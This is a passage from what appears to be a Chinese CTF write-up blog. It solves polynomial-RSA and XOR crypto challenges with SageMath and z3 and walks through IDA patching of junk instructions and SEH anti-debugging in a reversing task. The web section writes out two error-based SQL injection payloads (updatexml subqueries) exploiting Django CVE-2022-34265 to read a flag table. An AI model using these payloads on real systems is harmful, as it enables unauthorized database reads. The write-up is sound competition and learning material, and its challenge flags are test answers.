15316*y^55 + 8948*y^54 + 38*y^53 + 40329*y^52 + 9823*y^51 + 5798*y^50 + 6379*y^49 + 8662*y^48 + 34640*y^47 + 38321*y^46 + 18760*y^45 + 13135*y^44 + 15926*y^43 + 34952*y^42 + 28940*y^41 + 13558*y^40 + 42579*y^39 + 38015*y^38 + 33788*y^37 + 12381*y^36 + 195*y^35 + 13709*y^34 + 31500*y^33 + 32994*y^32 + 30486*y^31 + 40414*y^30 + 2578*y^29 + 30525*y^28 + 43067*y^27 + 6195*y^26 + 36288*y^25 + 23236*y^24 + 21493*y^23 + 15808*y^22 + 34500*y^21 + 6390*y^20 + 42994*y^19 + 42151*y^18 + 19248*y^17 + 19291*y^16 + 8124*y^15 + 40161*y^14 + 24726*y^13 + 31874*y^12 + 30272*y^11 + 30761*y^10 + 2296*y^9 + 11017*y^8 + 16559*y^7 + 28949*y^6 + 40499*y^5 + 22377*y^4 + 33628*y^3 + 30598*y^2 + 4386*y + 23814\")print(factor(N))e = 65537phi = (43753^65-1)*(43753^112-1)d = inverse_mod(e, phi)C = R(\"5209*y^176 + 10881*y^175 + 31096*y^174 + 23354*y^173 + 28337*y^172 + 15982*y^171 + 13515*y^170 + 21641*y^169 + 10254*y^168 + 34588*y^167 + 27434*y^166 + 29552*y^165 + 7105*y^164 + 22604*y^163 + 41253*y^162 + 42675*y^161 + 21153*y^160 + 32838*y^159 + 34391*y^158 + 832*y^157 + 720*y^156 + 22883*y^155 + 19236*y^154 + 33772*y^153 + 5020*y^152 + 17943*y^151 + 26967*y^150 + 30847*y^149 + 10306*y^148 + 33966*y^147 + 43255*y^146 + 20342*y^145 + 4474*y^144 + 3490*y^143 + 38033*y^142 + 11224*y^141 + 30565*y^140 + 31967*y^139 + 32382*y^138 + 9759*y^137 + 1030*y^136 + 32122*y^135 + 42614*y^134 + 14280*y^133 + 16533*y^132 + 32676*y^131 + 43070*y^130 + 36009*y^129 + 28497*y^128 + 2940*y^127 + 9747*y^126 + 22758*y^125 + 16615*y^124 + 14086*y^123 + 13038*y^122 + 39603*y^121 + 36260*y^120 + 32502*y^119 + 17619*y^118 + 17700*y^117 + 15083*y^116 + 11311*y^115 + 36496*y^114 + 1300*y^113 + 13601*y^112 + 43425*y^111 + 10376*y^110 + 11551*y^109 + 13684*y^108 + 14955*y^107 + 6661*y^106 + 12674*y^105 + 21534*y^104 + 32132*y^103 + 34135*y^102 + 43684*y^101 + 837*y^100 + 29311*y^99 + 4849*y^98 + 26632*y^97 + 26662*y^96 + 10159*y^95 + 32657*y^94 + 12149*y^93 + 17858*y^92 + 35805*y^91 + 19391*y^90 + 30884*y^89 + 42039*y^88 + 17292*y^87 + 4694*y^86 + 1497*y^85 + 1744*y^84 + 31071*y^83 + 26246*y^82 + 24402*y^81 + 22068*y^80 + 39263*y^79 + 23703*y^78 + 21484*y^77 + 12241*y^76 + 28821*y^75 + 32886*y^74 + 43075*y^73 + 35741*y^72 + 19936*y^71 + 37219*y^70 + 33411*y^69 + 8301*y^68 + 12949*y^67 + 28611*y^66 + 42654*y^65 + 6910*y^64 + 18523*y^63 + 31144*y^62 + 21398*y^61 + 36298*y^60 + 27158*y^59 + 918*y^58 + 38601*y^57 + 4269*y^56 + 5699*y^55 + 36444*y^54 + 34791*y^53 + 37978*y^52 + 32481*y^51 + 8039*y^50 + 11012*y^49 + 11454*y^48 + 30450*y^47 + 1381*y^46 + 32403*y^45 + 8202*y^44 + 8404*y^43 + 37648*y^42 + 43696*y^41 + 34237*y^40 + 36490*y^39 + 41423*y^38 + 35792*y^37 + 36950*y^36 + 31086*y^35 + 38970*y^34 + 12439*y^33 + 7963*y^32 + 16150*y^31 + 11382*y^30 + 3038*y^29 + 20157*y^28 + 23531*y^27 + 32866*y^26 + 5428*y^25 + 21132*y^24 + 13443*y^23 + 28909*y^22 + 42716*y^21 + 6567*y^20 + 24744*y^19 + 8727*y^18 + 14895*y^17 + 28172*y^16 + 30903*y^15 + 26608*y^14 + 27314*y^13 + 42224*y^12 + 42551*y^11 + 37726*y^10 + 11203*y^9 + 36816*y^8 + 5537*y^7 + 20301*y^6 + 17591*y^5 + 41279*y^4 + 7999*y^3 + 33753*y^2 + 34551*y + 9659\")m = pow(C, d, N)m = \"\".join([chr(c) for c in m.list()])print(m)#watevr{RSA_from_ikea_is_fun_but_insecure#k20944uehdjfnjd335uro}#flag{RSA_from_ikea_is_fun_but_insecure#k20944uehdjfnjd335uro} 另一篇很好的讲解：多项式RSAexp.sage: 12345678910111213141516171819#!/usr/bin/env sage# -*- coding: utf-8 -*-p = 43753R.&lt;x&gt; = PolynomialRing(GF(p))N = 34036*x^177 + 23068*x^176 + 13147*x^175 + 36344*x^174 + 10045*x^173 + 41049*x^172 + 17786*x^171 + 16601*x^170 + 7929*x^169 + 37570*x^168 + 990*x^167 + 9622*x^166 + 39273*x^165 + 35284*x^164 + 15632*x^163 + 18850*x^162 + 8800*x^161 + 33148*x^160 + 12147*x^159 + 40487*x^158 + 6407*x^157 + 34111*x^156 + 8446*x^155 + 21908*x^154 + 16812*x^153 + 40624*x^152 + 43506*x^151 + 39116*x^150 + 33011*x^149 + 23914*x^148 + 2210*x^147 + 23196*x^146 + 43359*x^145 + 34455*x^144 + 17684*x^143 + 25262*x^142 + 982*x^141 + 24015*x^140 + 27968*x^139 + 37463*x^138 + 10667*x^137 + 39519*x^136 + 31176*x^135 + 27520*x^134 + 32118*x^133 + 8333*x^132 + 38945*x^131 + 34713*x^130 + 1107*x^129 + 43604*x^128 + 4433*x^127 + 18110*x^126 + 17658*x^125 + 32354*x^124 + 3219*x^123 + 40238*x^122 + 10439*x^121 + 3669*x^120 + 8713*x^119 + 21027*x^118 + 29480*x^117 + 5477*x^116 + 24332*x^115 + 43480*x^114 + 33406*x^113 + 43121*x^112 + 1114*x^111 + 17198*x^110 + 22829*x^109 + 24424*x^108 + 16523*x^107 + 20424*x^106 + 36206*x^105 + 41849*x^104 + 3584*x^103 + 26500*x^102 + 31897*x^101 + 34640*x^100 + 27449*x^99 + 30962*x^98 + 41434*x^97 + 22125*x^96 + 24314*x^95 + 3944*x^94 + 18400*x^93 + 38476*x^92 + 28904*x^91 + 27936*x^90 + 41867*x^89 + 25573*x^88 + 25659*x^87 + 33443*x^86 + 18435*x^85 + 5934*x^84 + 38030*x^83 + 17563*x^82 + 24086*x^81 + 36782*x^80 + 20922*x^79 + 38933*x^78 + 23448*x^77 + 10599*x^76 + 7156*x^75 + 29044*x^74 + 23605*x^73 + 7657*x^72 + 28200*x^71 + 2431*x^70 + 3860*x^69 + 23259*x^68 + 14590*x^67 + 33631*x^66 + 15673*x^65 + 36049*x^64 + 29728*x^63 + 22413*x^62 + 18602*x^61 + 18557*x^60 + 23505*x^59 + 17642*x^58 + 12595*x^57 + 17255*x^56 + 15316*x^55 + 8948*x^54 + 38*x^53 + 40329*x^52 + 9823*x^51 + 5798*x^50 + 6379*x^49 + 8662*x^48 + 34640*x^47 + 38321*x^46 + 18760*x^45 + 13135*x^44 + 15926*x^43 + 34952*x^42 + 28940*x^41 + 13558*x^40 + 42579*x^39 + 38015*x^38 + 33788*x^37 + 12381*x^36 + 195*x^35 + 13709*x^34 + 31500*x^33 + 32994*x^32 + 30486*x^31 + 40414*x^30 + 2578*x^29 + 30525*x^28 + 43067*x^27 + 6195*x^26 + 36288*x^25 + 23236*x^24 + 21493*x^23 + 15808*x^22 + 34500*x^21 + 6390*x^20 + 42994*x^19 + 42151*x^18 + 19248*x^17 + 19291*x^16 + 8124*x^15 + 40161*x^14 + 24726*x^13 + 31874*x^12 + 30272*x^11 + 30761*x^10 + 2296*x^9 + 11017*x^8 + 16559*x^7 + 28949*x^6 + 40499*x^5 + 22377*x^4 + 33628*x^3 + 30598*x^2 + 4386*x + 23814c = 5209*x^176 + 10881*x^175 + 31096*x^174 + 23354*x^173 + 28337*x^172 + 15982*x^171 + 13515*x^170 + 21641*x^169 + 10254*x^168 + 34588*x^167 + 27434*x^166 + 29552*x^165 + 7105*x^164 + 22604*x^163 + 41253*x^162 + 42675*x^161 + 21153*x^160 + 32838*x^159 + 34391*x^158 + 832*x^157 + 720*x^156 + 22883*x^155 + 19236*x^154 + 33772*x^153 + 5020*x^152 + 17943*x^151 + 26967*x^150 + 30847*x^149 + 10306*x^148 + 33966*x^147 + 43255*x^146 + 20342*x^145 + 4474*x^144 + 3490*x^143 + 38033*x^142 + 11224*x^141 + 30565*x^140 + 31967*x^139 + 32382*x^138 + 9759*x^137 + 1030*x^136 + 32122*x^135 + 42614*x^134 + 14280*x^133 + 16533*x^132 + 32676*x^131 + 43070*x^130 + 36009*x^129 + 28497*x^128 + 2940*x^127 + 9747*x^126 + 22758*x^125 + 16615*x^124 + 14086*x^123 + 13038*x^122 + 39603*x^121 + 36260*x^120 + 32502*x^119 + 17619*x^118 + 17700*x^117 + 15083*x^116 + 11311*x^115 + 36496*x^114 + 1300*x^113 + 13601*x^112 + 43425*x^111 + 10376*x^110 + 11551*x^109 + 13684*x^108 + 14955*x^107 + 6661*x^106 + 12674*x^105 + 21534*x^104 + 32132*x^103 + 34135*x^102 + 43684*x^101 + 837*x^100 + 29311*x^99 + 4849*x^98 + 26632*x^97 + 26662*x^96 + 10159*x^95 + 32657*x^94 + 12149*x^93 + 17858*x^92 + 35805*x^91 + 19391*x^90 + 30884*x^89 + 42039*x^88 + 17292*x^87 + 4694*x^86 + 1497*x^85 + 1744*x^84 + 31071*x^83 + 26246*x^82 + 24402*x^81 + 22068*x^80 + 39263*x^79 + 23703*x^78 + 21484*x^77 + 12241*x^76 + 28821*x^75 + 32886*x^74 + 43075*x^73 + 35741*x^72 + 19936*x^71 + 37219*x^70 + 33411*x^69 + 8301*x^68 + 12949*x^67 + 28611*x^66 + 42654*x^65 + 6910*x^64 + 18523*x^63 + 31144*x^62 + 21398*x^61 + 36298*x^60 + 27158*x^59 + 918*x^58 + 38601*x^57 + 4269*x^56 + 5699*x^55 + 36444*x^54 + 34791*x^53 + 37978*x^52 + 32481*x^51 + 8039*x^50 + 11012*x^49 + 11454*x^48 + 30450*x^47 + 1381*x^46 + 32403*x^45 + 8202*x^44 + 8404*x^43 + 37648*x^42 + 43696*x^41 + 34237*x^40 + 36490*x^39 + 41423*x^38 + 35792*x^37 + 36950*x^36 + 31086*x^35 + 38970*x^34 + 12439*x^33 + 7963*x^32 + 16150*x^31 + 11382*x^30 + 3038*x^29 + 20157*x^28 + 23531*x^27 + 32866*x^26 + 5428*x^25 + 21132*x^24 + 13443*x^23 + 28909*x^22 + 42716*x^21 + 6567*x^20 + 24744*x^19 + 8727*x^18 + 14895*x^17 + 28172*x^16 + 30903*x^15 + 26608*x^14 + 27314*x^13 + 42224*x^12 + 42551*x^11 + 37726*x^10 + 11203*x^9 + 36816*x^8 + 5537*x^7 + 20301*x^6 + 17591*x^5 + 41279*x^4 + 7999*x^3 + 33753*x^2 + 34551*x + 9659S.&lt;x&gt; = R.quotient(N)P, Q = N.factor()P, Q = P[0], Q[0]phi = (p ** P.degree() - 1) * (p ** Q.degree() - 1)e = 0x10001d = inverse_mod(e, phi)m = pow(c, d, N)m = \"\".join([chr(c) for c in m.list()])print(m) 实例buuctf dasctf nov crypto easyrsa1234567891011121314151617181920212223242526272829303132333435363738394041from gmpy2 import *from Crypto.Util.number import *import random#from secrets import flagp1=getPrime(128)q=getPrime(128)n=p1**2+q**2print('n=',n)q=q+63066105847160076051036559850646146794def gen_prime(): while True: prime = sum([random.getrandbits(16) * q**i for i in range(6)]) if isPrime(prime): return primep, q, r = [gen_prime() for i in range(3)]n2=p*q*rprint('n2=',n2)while True: p1=next_prime(p1) p=next_prime(p) q=next_prime(q) r=next_prime(r) if (p-1)%7==0 and (q-1)%7 ==0 and (r-1)%7==0 and (p1-1)%7==0: breakn3=p1**3*p*q*re=7m=bytes_to_long(flag)c=pow(m,e,n3)print('c=',c)'''n=86073852484226203700520112718689325205597071202320413471730820840719099334770n2= 77582485123791158683121280616703899430016469065264033598472741751344256774648355531493586310864150337351815051848231793841751148287075688226384710343269278032576253497728407800522536152937473072438970839941923618053297480433385258911357458745700958378269978384670108026994918504237309072908971746160378531040480539649223970964653553804442759847964633088481940435582792404175653758785321463055628690804551479982557193366035172983893595403859872458966844805671311011033726279121149599533093604586152158331657286488305064843651636225644328162652701896037366058322959361248649656784810609391313c= 260434870216758498838321584935711394249835963213639852217120194663627852693180232036075839403208332707552953757185774603238436545434522971149891312380970896040823539050341723863717581297624370198483155582245220695123793458717418658539983101802256991837534210806768587736557644192367876024337837658337683388449336720569707094997412847022794461117019613124291022681935875774139147643806772608929174881451749463825639214096129554621195116737322890163556732291246108250543079041977037626755130422879778449546701988814607595746282148723362288451970833214072743929855505520539885650891349827459470540263153862109871050950881032032388185414677989393461533362690744724752363346530211163516319373099647590952338730''' exp.sage: 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env sage# coding: utf-8# In[1]:n = 86073852484226203700520112718689325205597071202320413471730820840719099334770p, q = two_squares(n)# In[2]:print(p)print(q)# In[21]:base = q + 63066105847160076051036559850646146794n2 = 77582485123791158683121280616703899430016469065264033598472741751344256774648355531493586310864150337351815051848231793841751148287075688226384710343269278032576253497728407800522536152937473072438970839941923618053297480433385258911357458745700958378269978384670108026994918504237309072908971746160378531040480539649223970964653553804442759847964633088481940435582792404175653758785321463055628690804551479982557193366035172983893595403859872458966844805671311011033726279121149599533093604586152158331657286488305064843651636225644328162652701896037366058322959361248649656784810609391313poly = sum(e * x^i for i,e in enumerate(Integer(n2).digits(base)))res = poly.factor_list()print(res)# In[22]:primes = []for r in res: f = r[0] primes.append(f(base))primes 再求exp.py 123456789101112131415161718192021222324252627282930from gmpy2 import *from Crypto.Util.number import *import randomn = 86073852484226203700520112718689325205597071202320413471730820840719099334770p, q, r = [65852498339760915228594889597136378107876107334695562152983809050259001488139010835535729480582643283480229654777004862320849604335829446520865511011593811440123502620735962409526109695434570356277, 42974281584522050062504679441184925920720278381761957641733614118720547476055402383959476142344396618643274705251619494499668048977089541037606316780609473959806621223833644762635231018066406261919, 27414656307685249691067705927388582241684529669740981719565564735302197575673076783872355553268011939023273356472727941960439764826793614011976095106476097211511966378338911454193294048309326195251]c = 260434870216758498838321584935711394249835963213639852217120194663627852693180232036075839403208332707552953757185774603238436545434522971149891312380970896040823539050341723863717581297624370198483155582245220695123793458717418658539983101802256991837534210806768587736557644192367876024337837658337683388449336720569707094997412847022794461117019613124291022681935875774139147643806772608929174881451749463825639214096129554621195116737322890163556732291246108250543079041977037626755130422879778449546701988814607595746282148723362288451970833214072743929855505520539885650891349827459470540263153862109871050950881032032388185414677989393461533362690744724752363346530211163516319373099647590952338730n2 = 77582485123791158683121280616703899430016469065264033598472741751344256774648355531493586310864150337351815051848231793841751148287075688226384710343269278032576253497728407800522536152937473072438970839941923618053297480433385258911357458745700958378269978384670108026994918504237309072908971746160378531040480539649223970964653553804442759847964633088481940435582792404175653758785321463055628690804551479982557193366035172983893595403859872458966844805671311011033726279121149599533093604586152158331657286488305064843651636225644328162652701896037366058322959361248649656784810609391313p1 = 200170033707580057053975766783012322797assert p * q * r == n2while True: p1=next_prime(p1) p=next_prime(p) q=next_prime(q) r=next_prime(r) if (p-1)%7==0 and (q-1)%7 ==0 and (r-1)%7==0 and (p1-1)%7==0: breakprint(f'p1 = %d' %p1)print(f'p = %d' %p)print(f'q = %d' %q)print(f'r = %d' %r)'''p1 = 200170033707580057053975766783012328327p = 65852498339760915228594889597136378107876107334695562152983809050259001488139010835535729480582643283480229654777004862320849604335829446520865511011593811440123502620735962409526109695434570389431q = 42974281584522050062504679441184925920720278381761957641733614118720547476055402383959476142344396618643274705251619494499668048977089541037606316780609473959806621223833644762635231018066406292679r = 27414656307685249691067705927388582241684529669740981719565564735302197575673076783872355553268011939023273356472727941960439764826793614011976095106476097211511966378338911454193294048309326229291''' 最后sage： 123456789101112131415p1 = 200170033707580057053975766783012328327p = 65852498339760915228594889597136378107876107334695562152983809050259001488139010835535729480582643283480229654777004862320849604335829446520865511011593811440123502620735962409526109695434570389431q = 42974281584522050062504679441184925920720278381761957641733614118720547476055402383959476142344396618643274705251619494499668048977089541037606316780609473959806621223833644762635231018066406292679r = 27414656307685249691067705927388582241684529669740981719565564735302197575673076783872355553268011939023273356472727941960439764826793614011976095106476097211511966378338911454193294048309326229291n = p1 ** 3 * p * q * rfrom Crypto.Util.number import *c = 260434870216758498838321584935711394249835963213639852217120194663627852693180232036075839403208332707552953757185774603238436545434522971149891312380970896040823539050341723863717581297624370198483155582245220695123793458717418658539983101802256991837534210806768587736557644192367876024337837658337683388449336720569707094997412847022794461117019613124291022681935875774139147643806772608929174881451749463825639214096129554621195116737322890163556732291246108250543079041977037626755130422879778449546701988814607595746282148723362288451970833214072743929855505520539885650891349827459470540263153862109871050950881032032388185414677989393461533362690744724752363346530211163516319373099647590952338730PR.&lt;x&gt; = Zmod(p)[]f = x ^ 7 - cres = f.roots()print(res)for i in res: if b'DASCTF' in long_to_bytes(int(i[0])): print(long_to_bytes(int(i[0])))# b'DASCTF{I_d0nt_kn0w_wh@t_i_w@nt_t0_d0_ju3t_d0_it_attack_we@k_prim4!!!}'","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://feverhu.github.io/categories/Crypto/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://feverhu.github.io/tags/RSA/"},{"name":"NTURE","slug":"NTURE","permalink":"https://feverhu.github.io/tags/NTURE/"}]},{"title":"2022 长城杯政企组 wp","slug":"2022-长城杯政企组-wp","date":"2022-08-25T16:05:23.000Z","updated":"2022-10-29T14:57:01.099Z","comments":true,"path":"2022/08/26/2022-长城杯政企组-wp/","link":"","permalink":"https://feverhu.github.io/2022/08/26/2022-%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%94%BF%E4%BC%81%E7%BB%84-wp/","excerpt":"","text":"2022 长城杯政企组 wp 这次比赛实际并列26名，前15名进入线下复赛，感觉距离线下赛越来越近了。Crypto简单题秒了，因为上班没有抢到前三拿加分，最后这道题第五。然后其余四个小时全部给了re的rabbit_hole，把大致的流程梳理出来了，但是卡在了异常处理，导致最后核心代码没有能够看到并且F5解析。队友做出来web题，赛后看了看misc的办公室爱情，也没用多少时间。如果比赛时候做了说不定就进复赛了？不可能的！没看规则，完全没有记得开录屏。马上打网鼎杯，不要忘了！ 那天打完比赛，Re没做出来实在气不过，于是联系了好多年不联系传奇人物刘大爷，请刘大爷出山给我指点迷津，刘大爷把题秒了，给我讲了两点，立马全都解决了，果然是刘大爷，这个wp大部分功劳是刘大爷的。 Crypto - xor task.py: 12345678910111213141516171819202122232425262728import osfrom secret import flagdef cut(obj, sec): return [obj[i:i+sec] for i in range(0,len(obj),sec)]x = 6assert flag.startswith(&#x27;flag&#123;&#x27;)assert flag.endswith(&#x27;&#125;&#x27;)m = cut(flag, x)pad = os.urandom(x)res = []for i in m: tmp = [] tmp.append(i[0] ^ i[1] ^ i[2] ^ pad[0]) tmp.append(i[3] ^ i[4] ^ pad[1] ^ pad[2]) tmp.append(pad[5] ^ i[5] ^ pad[1] ^ pad[3]) tmp.append(i[3] ^ pad[3] ^ pad[4] ^ pad[1]) tmp.append(i[5] ^ pad[0] ^ i[4] ^ pad[1]) tmp.append(i[2] ^ i[4] ^ pad[0] ^ pad[1]) tmp.append(i[2] ^ i[0] ^ i[4] ^ pad[4]) res.append(tmp)print(res)#[[150, 194, 49, 195, 23, 79, 66], [194, 136, 63, 147, 3, 2, 81], [132, 221, 57, 144, 83, 83, 93], [208, 223, 37, 193, 28, 0, 70], [154, 203, 108, 156, 28, 78, 68], [159, 221, 62, 146, 86, 82, 88], [197, 141, 117, 192, 31, 90, 85]] 入门题目，“flag{”是flag的前5位，然后是一个7元的方程，求pad6个数和flag{后一位有7个方程正好可以解。用z3即可。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from z3 import *##求random，已知前5位是flag&#123;i = b&quot;flag&#123;&quot;so = Solver()ans = [150, 194, 49, 195, 23, 79, 66]flag5 = BitVec(&#x27;flag5&#x27;,8)pad = [BitVec(f&#x27;pad&#123;i&#125;&#x27;,8) for i in range(6)]so.add(i[0] ^ i[1] ^ i[2] ^ pad[0] == ans[0])so.add(i[3] ^ i[4] ^ pad[1] ^ pad[2] == ans[1])so.add(pad[5] ^ flag5 ^ pad[1] ^ pad[3] == ans[2])so.add(i[3] ^ pad[3] ^ pad[4] ^ pad[1] == ans[3])so.add(flag5 ^ pad[0] ^ i[4] ^ pad[1] == ans[4])so.add(i[2] ^ i[4] ^ pad[0] ^ pad[1] == ans[5])so.add(i[2] ^ i[0] ^ i[4] ^ pad[4] == ans[6])pad_ = []if so.check() == sat: m = so.model() for k in range(6): #print(m.eval(pad[k]).as_long()) pad_.append(m.eval(pad[k]).as_long())#print(pad_)#[253, 168, 118, 50, 62, 146]ans = [[150, 194, 49, 195, 23, 79, 66], [194, 136, 63, 147, 3, 2, 81], [132, 221, 57, 144, 83, 83, 93], [208, 223, 37, 193, 28, 0, 70], [154, 203, 108, 156, 28, 78, 68], [159, 221, 62, 146, 86, 82, 88], [197, 141, 117, 192, 31, 90, 85]]flag_ = &quot;&quot;pad = pad_for i in ans: so = Solver() flag = [BitVec(f&#x27;flag&#123;i&#125;&#x27;,8) for i in range(6)] so.add(flag[0] ^ flag[1] ^ flag[2] ^ pad[0] == i[0]) so.add(flag[3] ^ flag[4] ^ pad[1] ^ pad[2] == i[1]) so.add(pad[5] ^ flag[5] ^ pad[1] ^ pad[3] == i[2]) so.add(flag[3] ^ pad[3] ^ pad[4] ^ pad[1] == i[3]) so.add(flag[5] ^ pad[0] ^ flag[4] ^ pad[1] == i[4]) so.add(flag[2] ^ flag[4] ^ pad[0] ^ pad[1] == i[5]) so.add(flag[2] ^ flag[0] ^ flag[4] ^ pad[4] == i[6]) if so.check() == sat: m = so.model() #print(&#x27;&#x27;.join(chr(m[i].as_long()) for i in flag)) flag_ += &#x27;&#x27;.join(chr(m[i].as_long()) for i in flag) else: print(&#x27;Error&#x27;)print(flag_)#flag&#123;98167a7e-1471-11ed-a068-da12656dd8d7&#125; Web - djangogogo 这题题解是队友写的。 CVE-2022-34265 Django Extract &amp; Trunc SQL注入漏洞 参考资料：http://www.ctfiot.com/47944.html 由于字符长度限制。用/?name=YEAR FROM sale_datetime)) and updatexml(1,concat(1,(select flag from flag),1),1)--获取前半截flag。 1661257426458 用/?name=YEAR FROM sale_datetime)) and updatexml(10,concat((select RIGHT(flag,14) from flag ),1,1,1,1,1,1,1,1),1)--获得后半段flag。 1661257431800 Misc - 办公室爱情 有大佬师傅写出来了：https://blog.csdn.net/weixin_44418623/article/details/126493352 [题目下载][办公室爱情](办公室爱情.zip) Reverse - rabbit hole 这道题拿到以后运行起来，看起来像很朴素的题目，并且通过Exeinfo，并没有什么壳。 1661446868005 然后用ida运行，找到main函数0x004016C0，发现完全不能F5。仔细看有两种画指令。第一种： 1661447008186 这种可以直接patch掉EB FF中EB这一位，变成nop(90)，然后在40170A地址上按C转换为code，就可以看到后面的指令了。第二种： 1661447155378 这种往上jmp的第一次见。经过尝试可以patch掉4017D5和4017D6两个地址为nop，然后nop掉jmp语句后面的五个地址4017D9到4017DD也nop掉。这种花指令就完成了。 1661447330411 经过一顿漫长的操作，找到main函数的retn，从main函数push ebp开始选中到retn，按p，再f5终于可以看出main函数的全貌了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980int __cdecl main(int argc, const char **argv, const char **envp)&#123; /* 有一堆变量定义就不贴了，大家注意变量类型。 */ v31[0] = v3; v31[1] = retaddr; v4 = alloca(4532); atexit(sub_401660); sub_401A40(); gets_s(v29, 0x100u); v5 = strlen(v29); v6 = BYTE2(v5) ^ (16777619 * (BYTE1(v5) ^ (16777619 * ((unsigned __int8)v5 ^ 0x50C5D1F)))); v7 = HIBYTE(v5) ^ (16777619 * v6); if ( v7 != 1166501587 ) &#123; if ( v7 == 1563082853 ) &#123; v8 = 0; for ( i = 0; ; i = v9 + 16 ) &#123; v25 = v8; if ( (HIBYTE(v8) ^ (16777619 * (BYTE2(v8) ^ (16777619 * (BYTE1(v8) ^ (16777619 * ((unsigned __int8)v8 ^ 0x50C5D1F))))))) == 1563082853 ) break; v28 = 0; v9 = i; for ( j = 0; ; j = v26 + 1 ) &#123; v26 = j; if ( (HIBYTE(j) ^ (16777619 * (BYTE2(j) ^ (16777619 * (BYTE1(j) ^ (16777619 * ((unsigned __int8)j ^ 0x50C5D1F))))))) == 1563082853 ) break; v9 = i; v28 += v29[v26] * byte_404AC0[i + v26]; &#125; v11 = v25; *((_BYTE *)&amp;v31[-1130] + v25) = v28; v8 = v11 + 1; &#125; for ( k = 0; (HIBYTE(k) ^ (16777619 * (BYTE2(k) ^ (16777619 * (BYTE1(k) ^ (16777619 * ((unsigned __int8)k ^ 0x50C5D1F))))))) != 1563082853; ++k ) &#123; if ( *((_BYTE *)&amp;v31[-1130] + k) != byte_404AAC[k] ) &#123; v13 = sub_401A40(); std::ostream::operator&lt;&lt;(v13); exit(-1); &#125; &#125; v14 = sub_401A40(); std::ostream::operator&lt;&lt;(v14); JUMPOUT(0x401A17); &#125; v15 = sub_401A40(); std::ostream::operator&lt;&lt;(v15); exit(-1); &#125; strcpy(v30, &quot;The quick brown fox jumps over the lazy dog.&quot;); sub_401000(v30, v6); memset(v30, 0, 40); v17 = sub_4014E0(v30, v29, v16); for ( m = 0; m &lt; 40; ++m ) &#123; LOBYTE(v17) = v30[m]; if ( (_BYTE)v17 != byte_404BC0[m] ) &#123; v22 = (*(int (**)(void))(v17 + 1284029000))(); byte_402FFF[v22 - 4206718] += BYTE1(v23); *(_BYTE *)(v23 - 23) += v24; JUMPOUT(0x401A3D); &#125; &#125; v19 = sub_401A40(); v20 = std::ostream::operator&lt;&lt;(v19); (*(void (**)(void))(v20 - 62026936))(); return 0;&#125; 第一个需要逆向的地方是v6 = BYTE2(v5) ^ (16777619 * (BYTE1(v5) ^ (16777619 * ((unsigned __int8)v5 ^ 0x50C5D1F)))); v7 = HIBYTE(v5) ^ (16777619 * v6);if ( v7 != 1166501587 ) 其中v5是输入字符串的长度，类型为int，四个字节。BYTE1是v5第二个字节，BYTE2是v5第三个字节，HIBYTE是最高字节，注意C语言变量是小端序。这段代码就是最小的字节和0x50C5D1F异或以后，乘以16777619，再和下一个字节异或，直到最高字节。于是python脚本： 12345678for i in range(256): v7 = i v8 = ((v7 &gt;&gt; 16) &amp; 0xff) ^ ((0x1000193 * (((v7 &gt;&gt; 8) &amp; 0xff) ^ ((0x1000193 * (((v7 &amp; 0xFF) ^ 0x50C5D1F) &amp; 0xFFFFFFFF)) &amp; 0xFFFFFFFF))) &amp; 0xFFFFFFFF) v9 = ((v7 &gt;&gt; 32) &amp; 0xff) ^ ((0x1000193 * v8) &amp; 0xFFFFFFFF) if (v9 == 0x458766D3 or v9 == 0x5D2AC065): print(v9,i)0x5d2ac065 160x458766d3 134 这里有两个分支，长度为134的分支是正确的。长度是16的分支进入下面的代码 1661448528575 1661448555663 无论结果是啥都进入了0x401A40的地址，猜测一下，结合下文，很容易知道这段不是需要走的分支。（比赛时候我动调进去了，查了小一会儿发现不对，还是too young！这题应该有反调试，可能是SEH的，我的x96dbg有过反调插件sharpOD。ida直接动调不行的。） 之后，有个关键函数0x4014E0很可疑，调用了输入变量v29。 1661448781490 经过一通patch后f5看到函数4014E0。发现关键语句ms_exc.registration.TryLevel = 0 这是try except的特征。tab进入汇编视图发现有try，并且在0x401546产生了异常，进入except。当时看到了 https://bbs.pediy.com/thread-252152.htm 这篇大佬师傅写的文章，也研究了一下，动调在这里也断掉了一直挂。怎么也搞不通，直到比赛结束，我还是个老菜鸡。 1661448903235 这个异常最后进入了0x4011E0这个函数，这是比赛中调到的地方。 1661449148944 比赛结束之后，晚上问大爷，大爷解释：1、这个异常是void x() &#123;char a[0];a[1145141919810];&#125; 2、SEH 反调试的原理是，遇到异常的时候会首先交给调试器，单步过不去。调试器需要改参数。 1661449598278 忽略范围-开始-C0000005-确定。添加了这个就不会在0x401546卡住了。接着在exception handler下个断点可以进入0x4011E0这个最后的函数了。最后的函数中，也是一个try exception跳到exception欺骗ida，ida确实不分析exception handler 里的代码。之后经过大爷提示，在异常代码地址patch，用jmp直接跳到exception handler就行。把0x401232地址patch成jmp到0x401278，并且把0x401278上的try except的code也patch掉了。 1661450025162 1661450043745 f5后得到了最后的函数，核心部分： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071 v1 = 0; v10 = 0; v2 = input; if ( !strlen(input) ) &#123; LOWORD(v4) = 0; LOWORD(v5) = 0;LABEL_21: if ( (HIBYTE(v18) ^ (16777619 * (BYTE2(v18) ^ (16777619 * (BYTE1(v5) ^ (16777619 * ((unsigned __int8)v5 ^ 0x50C5D1F))))))) != 1636823865 &amp;&amp; (HIBYTE(v17) ^ (16777619 * (BYTE2(v17) ^ (16777619 * (BYTE1(v4) ^ (16777619 * ((unsigned __int8)v4 ^ 0x50C5D1F))))))) != 1636823865 ) &#123; puts(v9); exit(-1); &#125; for ( i = 0; i &lt; 41; ++i ) putchar((unsigned __int8)(*((_BYTE *)v12 + i) + *((_BYTE *)v14 + i))); putchar(10); exit(0); &#125; v3 = 0; v16 = 0; v4 = 0; v5 = 0; while ( 1 ) &#123; v6 = v2[v1]; switch ( v6 ) &#123; case &#x27;h&#x27;: v18 = --v5; v3 -= 21; v16 = v3; goto LABEL_12; case &#x27;j&#x27;: v18 = v5 + 1; v16 = v3 + 21; v4 = v17; ++v5; v3 += 21; v1 = v10; v2 = input; goto LABEL_12; case &#x27;k&#x27;: --v4; break; case 